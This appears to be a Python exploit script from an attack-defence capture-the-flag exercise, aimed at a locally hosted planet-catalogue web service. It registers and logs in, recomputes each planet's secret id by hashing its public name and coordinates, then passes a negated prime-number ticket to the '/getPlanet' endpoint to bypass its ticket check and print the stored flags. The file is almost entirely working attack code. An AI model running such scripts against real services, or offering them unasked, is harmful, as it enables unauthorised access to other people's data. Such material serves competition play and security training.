import hashlib
from primes import prime_tickets
import requests
import re
from bs4 import BeautifulSoup
import json

target = "http://127.0.0.1:8000"

username = "veryUniqueUN"
password = "veryUniquePW"


def register():
    print("Start registration  U: " + username + "  P: " + password, flush=True)
    data = {'username': username, 'password': password}
    resp = requests.post(target + '/register', data)


def login():
    print("loging in")
    data = {'username': username, 'password': password}

    resp = requests.post(target + '/login', data)
    cookie = resp.cookies["session"]

    planetNames = []
    for line in resp.text.split("\n"):
        if ("/planet_details?n" in line):
            # print(line)

            m = re.search('Name: (.+?)</a>', line)
            if m:
                n = m.group(1)
                planetNames.append(n)

    return planetNames, cookie


def getPlanetDetails(planetName, cookie):
    headers = {"cookie": "session=" + cookie}
    resp = requests.get(target + '/planet_details?name=' + planetName, headers=headers)
    html = resp.text
    parsed = BeautifulSoup(html, 'html.parser').body.find_all('label')
    name = parsed[1].text
    declination = parsed[3].text
    right_ascension = parsed[5].text

    # create id
    e = name.encode('utf-8')
    d = declination.encode('utf-8')
    r = right_ascension.encode('utf-8')
    h = hashlib.sha256(e + d + r)
    idd = h.hexdigest()

    return idd


def getflag(id, cookie):
    headers = {"cookie": "session=" + cookie}
    resp = requests.get(target + '/getPlanet?ticket=' + '-' + str(prime_tickets.pop()) + '&id=' + id, headers=headers)
    # print(resp.text)
    try:
        resp_dict = json.loads(resp.text)
        print(resp_dict['name'])
        print(resp_dict['flag'])
    except:
        print("something went wrong maybe ticket isnt valid")
        print(resp.text)

def exploit():
    register()
    planetNames, cookie = login()
    for planetName in planetNames:
        id = getPlanetDetails(planetName, cookie)
        getflag(id, cookie)


if __name__ == "__main__":
    exploit()
